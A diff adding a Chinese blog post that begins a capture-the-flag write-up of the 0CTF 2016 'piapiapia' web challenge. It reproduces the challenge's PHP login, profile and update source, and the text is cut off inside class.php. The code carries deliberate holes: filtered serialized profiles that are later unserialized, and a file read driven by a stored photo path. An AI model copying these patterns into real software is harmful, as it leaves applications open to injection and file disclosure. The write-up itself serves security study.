@@ -470,6 +470,230 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/05/13/20210513/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="花间一壶酒">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2021/05/13/20210513/" itemprop="url">（0CTF 2016）piapiapia</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-05-13T22:17:45+08:00">
+                2021-05-13
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h2><p><img src="https://img-blog.csdnimg.cn/20210513144143165.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>目录扫描<br><img src="https://img-blog.csdnimg.cn/2021051314354438.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现  <code>www.zip</code>  下载打开</p>
+<p><img src="https://img-blog.csdnimg.cn/20210513143719717.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h3 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	require_once(&#x27;class.php&#x27;);</span><br><span class="line">	if($_SESSION[&#x27;username&#x27;]) &#123;</span><br><span class="line">		header(&#x27;Location: profile.php&#x27;);</span><br><span class="line">		<span class="built_in">exit</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	if($_POST[&#x27;username&#x27;] &amp;&amp; $_POST[&#x27;password&#x27;]) &#123;</span><br><span class="line">		$username = $_POST[&#x27;username&#x27;];</span><br><span class="line">		$password = $_POST[&#x27;password&#x27;];</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="built_in">strlen</span>($username) &lt; <span class="number">3</span> <span class="keyword">or</span> <span class="built_in">strlen</span>($username) &gt; <span class="number">16</span>) </span><br><span class="line">			die(&#x27;Invalid user name&#x27;);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="built_in">strlen</span>($password) &lt; <span class="number">3</span> <span class="keyword">or</span> <span class="built_in">strlen</span>($password) &gt; <span class="number">16</span>) </span><br><span class="line">			die(&#x27;Invalid password&#x27;);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>($user-&gt;login($username, $password)) &#123;</span><br><span class="line">			$_SESSION[&#x27;username&#x27;] = $username;</span><br><span class="line">			header(&#x27;Location: profile.php&#x27;);</span><br><span class="line">			<span class="built_in">exit</span>;	</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			die(&#x27;Invalid user name or password&#x27;);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;title&gt;Login&lt;/title&gt;</span><br><span class="line">   &lt;link href=<span class="string">&quot;static/bootstrap.min.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;div class=<span class="string">&quot;container&quot;</span> style=<span class="string">&quot;margin-top:100px&quot;</span>&gt;  </span><br><span class="line">		&lt;form action=<span class="string">&quot;index.php&quot;</span> method=<span class="string">&quot;post&quot;</span> class=<span class="string">&quot;well&quot;</span> style=<span class="string">&quot;width:220px;margin:0px auto;&quot;</span>&gt; </span><br><span class="line">			&lt;img src=<span class="string">&quot;static/piapiapia.gif&quot;</span> class=<span class="string">&quot;img-memeda &quot;</span> style=<span class="string">&quot;width:180px;margin:0px auto;&quot;</span>&gt;</span><br><span class="line">			&lt;h3&gt;Login&lt;/h3&gt;</span><br><span class="line">			&lt;label&gt;Username:&lt;/label&gt;</span><br><span class="line">			&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span> style=<span class="string">&quot;height:30px&quot;</span>class=<span class="string">&quot;span3&quot;</span>/&gt;</span><br><span class="line">			&lt;label&gt;Password:&lt;/label&gt;</span><br><span class="line">			&lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password&quot;</span> style=<span class="string">&quot;height:30px&quot;</span> class=<span class="string">&quot;span3&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">			&lt;button type=<span class="string">&quot;submit&quot;</span> class=<span class="string">&quot;btn btn-primary&quot;</span>&gt;LOGIN&lt;/button&gt;</span><br><span class="line">		&lt;/form&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="register-php"><a href="#register-php" class="headerlink" title="register.php"></a>register.php</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	require_once(&#x27;class.php&#x27;);</span><br><span class="line">	if($_POST[&#x27;username&#x27;] &amp;&amp; $_POST[&#x27;password&#x27;]) &#123;</span><br><span class="line">		$username = $_POST[&#x27;username&#x27;];</span><br><span class="line">		$password = $_POST[&#x27;password&#x27;];</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="built_in">strlen</span>($username) &lt; <span class="number">3</span> <span class="keyword">or</span> <span class="built_in">strlen</span>($username) &gt; <span class="number">16</span>) </span><br><span class="line">			die(&#x27;Invalid user name&#x27;);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="built_in">strlen</span>($password) &lt; <span class="number">3</span> <span class="keyword">or</span> <span class="built_in">strlen</span>($password) &gt; <span class="number">16</span>) </span><br><span class="line">			die(&#x27;Invalid password&#x27;);</span><br><span class="line">		<span class="keyword">if</span>(!$user-&gt;is_exists($username)) &#123;</span><br><span class="line">			$user-&gt;<span class="keyword">register</span>($username, $password);</span><br><span class="line">			echo &#x27;Register OK!&lt;a href=&quot;index.php&quot;&gt;Please Login&lt;/a&gt;&#x27;;		</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			die(&#x27;User name Already Exists&#x27;);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;title&gt;Login&lt;/title&gt;</span><br><span class="line">   &lt;link href=<span class="string">&quot;static/bootstrap.min.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;div class=<span class="string">&quot;container&quot;</span> style=<span class="string">&quot;margin-top:100px&quot;</span>&gt;  </span><br><span class="line">		&lt;form action=<span class="string">&quot;register.php&quot;</span> method=<span class="string">&quot;post&quot;</span> class=<span class="string">&quot;well&quot;</span> style=<span class="string">&quot;width:220px;margin:0px auto;&quot;</span>&gt; </span><br><span class="line">			&lt;img src=<span class="string">&quot;static/piapiapia.gif&quot;</span> class=<span class="string">&quot;img-memeda &quot;</span> style=<span class="string">&quot;width:180px;margin:0px auto;&quot;</span>&gt;</span><br><span class="line">			&lt;h3&gt;Register&lt;/h3&gt;</span><br><span class="line">			&lt;label&gt;Username:&lt;/label&gt;</span><br><span class="line">			&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span> style=<span class="string">&quot;height:30px&quot;</span>class=<span class="string">&quot;span3&quot;</span>/&gt;</span><br><span class="line">			&lt;label&gt;Password:&lt;/label&gt;</span><br><span class="line">			&lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password&quot;</span> style=<span class="string">&quot;height:30px&quot;</span> class=<span class="string">&quot;span3&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">			&lt;button type=<span class="string">&quot;submit&quot;</span> class=<span class="string">&quot;btn btn-primary&quot;</span>&gt;REGISTER&lt;/button&gt;</span><br><span class="line">		&lt;/form&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="profile-php"><a href="#profile-php" class="headerlink" title="profile.php"></a>profile.php</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	require_once(&#x27;class.php&#x27;);</span><br><span class="line">	if($_SESSION[&#x27;username&#x27;] == null) &#123;</span><br><span class="line">		die(&#x27;Login First&#x27;);	</span><br><span class="line">	&#125;</span><br><span class="line">	$username = $_SESSION[&#x27;username&#x27;];</span><br><span class="line">	$profile=$user-&gt;show_profile($username);</span><br><span class="line">	<span class="keyword">if</span>($profile  == null) &#123;</span><br><span class="line">		header(&#x27;Location: update.php&#x27;);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		$profile = unserialize($profile);</span><br><span class="line">		$phone = $profile[&#x27;phone&#x27;];</span><br><span class="line">		$email = $profile[&#x27;email&#x27;];</span><br><span class="line">		$nickname = $profile[&#x27;nickname&#x27;];</span><br><span class="line">		$photo = base64_encode(file_get_contents($profile[&#x27;photo&#x27;]));</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;title&gt;Profile&lt;/title&gt;</span><br><span class="line">   &lt;link href=<span class="string">&quot;static/bootstrap.min.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;div class=<span class="string">&quot;container&quot;</span> style=<span class="string">&quot;margin-top:100px&quot;</span>&gt;  </span><br><span class="line">		&lt;img src=<span class="string">&quot;data:image/gif;base64,&lt;?php echo $photo; ?&gt;&quot;</span> class=<span class="string">&quot;img-memeda &quot;</span> style=<span class="string">&quot;width:180px;margin:0px auto;&quot;</span>&gt;</span><br><span class="line">		&lt;h3&gt;Hi &lt;?php echo $nickname;?&gt;&lt;/h3&gt;</span><br><span class="line">		&lt;label&gt;Phone: &lt;?php echo $phone;?&gt;&lt;/label&gt;</span><br><span class="line">		&lt;label&gt;Email: &lt;?php echo $email;?&gt;&lt;/label&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="update-php"><a href="#update-php" class="headerlink" title="update.php"></a>update.php</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	require_once(&#x27;class.php&#x27;);</span><br><span class="line">	if($_SESSION[&#x27;username&#x27;] == null) &#123;</span><br><span class="line">		die(&#x27;Login First&#x27;);	</span><br><span class="line">	&#125;</span><br><span class="line">	if($_POST[&#x27;phone&#x27;] &amp;&amp; $_POST[&#x27;email&#x27;] &amp;&amp; $_POST[&#x27;nickname&#x27;] &amp;&amp; $_FILES[&#x27;photo&#x27;]) &#123;</span><br><span class="line"></span><br><span class="line">		$username = $_SESSION[&#x27;username&#x27;];</span><br><span class="line">		if(!preg_match(&#x27;/^\d&#123;11&#125;$/&#x27;, $_POST[&#x27;phone&#x27;]))</span><br><span class="line">			die(&#x27;Invalid phone&#x27;);</span><br><span class="line"></span><br><span class="line">		if(!preg_match(&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;, $_POST[&#x27;email&#x27;]))</span><br><span class="line">			die(&#x27;Invalid email&#x27;);</span><br><span class="line">		</span><br><span class="line">		if(preg_match(&#x27;/[^a-zA-Z0-9_]/&#x27;, $_POST[&#x27;nickname&#x27;]) || strlen($_POST[&#x27;nickname&#x27;]) &gt; 10)</span><br><span class="line">			die(&#x27;Invalid nickname&#x27;);</span><br><span class="line"></span><br><span class="line">		$file = $_FILES[&#x27;photo&#x27;];</span><br><span class="line">		if($file[&#x27;size&#x27;] &lt; 5 or $file[&#x27;size&#x27;] &gt; 1000000)</span><br><span class="line">			die(&#x27;Photo size error&#x27;);</span><br><span class="line"></span><br><span class="line">		move_uploaded_file($file[&#x27;tmp_name&#x27;], &#x27;upload/&#x27; . md5($file[&#x27;name&#x27;]));</span><br><span class="line">		$profile[&#x27;phone&#x27;] = $_POST[&#x27;phone&#x27;];</span><br><span class="line">		$profile[&#x27;email&#x27;] = $_POST[&#x27;email&#x27;];</span><br><span class="line">		$profile[&#x27;nickname&#x27;] = $_POST[&#x27;nickname&#x27;];</span><br><span class="line">		$profile[&#x27;photo&#x27;] = &#x27;upload/&#x27; . md5($file[&#x27;name&#x27;]);</span><br><span class="line"></span><br><span class="line">		$user-&gt;update_profile($username, serialize($profile));</span><br><span class="line">		echo &#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;title&gt;UPDATE&lt;/title&gt;</span><br><span class="line">   &lt;link href=<span class="string">&quot;static/bootstrap.min.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;div class=<span class="string">&quot;container&quot;</span> style=<span class="string">&quot;margin-top:100px&quot;</span>&gt;  </span><br><span class="line">		&lt;form action=<span class="string">&quot;update.php&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span> class=<span class="string">&quot;well&quot;</span> style=<span class="string">&quot;width:220px;margin:0px auto;&quot;</span>&gt; </span><br><span class="line">			&lt;img src=<span class="string">&quot;static/piapiapia.gif&quot;</span> class=<span class="string">&quot;img-memeda &quot;</span> style=<span class="string">&quot;width:180px;margin:0px auto;&quot;</span>&gt;</span><br><span class="line">			&lt;h3&gt;Please Update Your Profile&lt;/h3&gt;</span><br><span class="line">			&lt;label&gt;Phone:&lt;/label&gt;</span><br><span class="line">			&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;phone&quot;</span> style=<span class="string">&quot;height:30px&quot;</span>class=<span class="string">&quot;span3&quot;</span>/&gt;</span><br><span class="line">			&lt;label&gt;Email:&lt;/label&gt;</span><br><span class="line">			&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;email&quot;</span> style=<span class="string">&quot;height:30px&quot;</span>class=<span class="string">&quot;span3&quot;</span>/&gt;</span><br><span class="line">			&lt;label&gt;Nickname:&lt;/label&gt;</span><br><span class="line">			&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;nickname&quot;</span> style=<span class="string">&quot;height:30px&quot;</span> class=<span class="string">&quot;span3&quot;</span>&gt;</span><br><span class="line">			&lt;label <span class="keyword">for</span>=<span class="string">&quot;file&quot;</span>&gt;Photo:&lt;/label&gt;</span><br><span class="line">			&lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;photo&quot;</span> style=<span class="string">&quot;height:30px&quot;</span>class=<span class="string">&quot;span3&quot;</span>/&gt;</span><br><span class="line">			&lt;button type=<span class="string">&quot;submit&quot;</span> class=<span class="string">&quot;btn btn-primary&quot;</span>&gt;UPDATE&lt;/button&gt;</span><br><span class="line">		&lt;/form&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="config-php"><a href="#config-php" class="headerlink" title="config.php"></a>config.php</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$config[&#x27;hostname&#x27;] = &#x27;127.0.0.1&#x27;;</span><br><span class="line">	$config[&#x27;username&#x27;] = &#x27;root&#x27;;</span><br><span class="line">	$config[&#x27;password&#x27;] = &#x27;&#x27;;</span><br><span class="line">	$config[&#x27;database&#x27;] = &#x27;&#x27;;</span><br><span class="line">	$flag = &#x27;&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="class-php"><a href="#class-php" class="headerlink" title="class.php"></a>class.php</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require(&#x27;config.php&#x27;);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span> <span class="title">extends</span> <span class="title">mysql</span>&#123;</span></span><br><span class="line">	private $table = &#x27;users&#x27;;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> function <span class="title">is_exists</span><span class="params">($username)</span> </span>&#123;</span><br><span class="line">		$username = parent::filter($username);</span><br><span class="line"></span><br><span class="line">		$where = <span class="string">&quot;username = &#x27;$username&#x27;&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> parent::select($<span class="keyword">this</span>-&gt;table, $where);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> function <span class="title">register</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">		$username = parent::filter($username);</span><br><span class="line">		$password = parent::filter($password);</span><br><span class="line"></span><br><span class="line">		$key_list = Array(&#x27;username&#x27;, &#x27;password&#x27;);</span><br><span class="line">		$value_list = Array($username, md5($password));</span><br><span class="line">		<span class="keyword">return</span> parent::insert($<span class="keyword">this</span>-&gt;table, $key_list, $value_list);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> function <span class="title">login</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">		$username = parent::filter($username);</span><br><span class="line">		$password = parent::filter($password);</span><br><span class="line"></span><br><span class="line">		$where = <span class="string">&quot;username = &#x27;$username&#x27;&quot;</span>;</span><br><span class="line">		$object = parent::select($<span class="keyword">this</span>-&gt;table, $where);</span><br><span class="line">		<span class="keyword">if</span> ($object &amp;&amp; $object-&gt;password === md5($password)) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> function <span class="title">show_profile</span><span class="params">($username)</span> </span>&#123;</span><br><span class="line">		$username = parent::filter($username);</span><br><span class="line"></span><br><span class="line">		$where = <span class="string">&quot;username = &#x27;$username&#x27;&quot;</span>;</span><br><span class="line">		$object = parent::select($<span class="keyword">this</span>-&gt;table, $where);</span><br><span class="line">		<span class="keyword">return</span> $object-&gt;profile;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> function <span class="title">update_profile</span><span class="params">($username, $new_profile)</span> </span>&#123;</span><br><span class="line">		$username = parent::filter($username);</span><br><span class="line">		$new_profile = parent::filter($new_profile);</span><br><span class="line"></span><br><span class="line">		$where = <span class="string">&quot;username = &#x27;$username&#x27;&quot;</span>;</span><br><span class="line">		return parent::update($this-&gt;table, &#x27;profile&#x27;, $new_profile, $where);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> function __tostring() &#123;</span><br><span class="line">		<span class="keyword">return</span> 